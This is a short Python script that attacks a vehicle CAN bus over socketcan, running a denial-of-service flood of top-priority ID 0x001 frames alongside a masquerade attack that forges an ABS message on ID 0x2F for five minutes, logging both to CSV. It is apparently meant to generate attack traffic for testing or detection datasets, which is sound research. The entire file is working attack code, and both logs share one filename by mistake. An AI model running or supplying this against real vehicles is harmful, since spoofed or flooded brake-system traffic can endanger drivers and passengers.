import can
import time
import threading
import csv

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_dos_log_file = 'combined_dos_attack_log.csv'
attack_masquerade_log_file = 'combined_dos_attack_log.csv'

def dos_attack():
    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_dos_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            # High priority CAN message flooding
            msg = can.Message(arbitration_id=0x001, data=[0x00] * 8, is_extended_id=False)
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.1)  # Small delay to prevent overwhelming the hardware

def masquerade_attack():
    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_masquerade_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            # Forged ABS message to simulate switch-on
            msg = can.Message(arbitration_id=0x2F, data=[0xFF] * 8, is_extended_id=False)
            
            # Send CAN message
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.1)  # Small delay to prevent overwhelming the hardware

if __name__ == "__main__":
    # Create threads for DoS and masquerade attacks
    dos_thread = threading.Thread(target=dos_attack)
    masquerade_thread = threading.Thread(target=masquerade_attack)
    
    # Start both threads
    dos_thread.start()
    masquerade_thread.start()
    
    # Wait for both threads to complete (which they won't, since they're infinite loops)
    dos_thread.join()
    masquerade_thread.join()
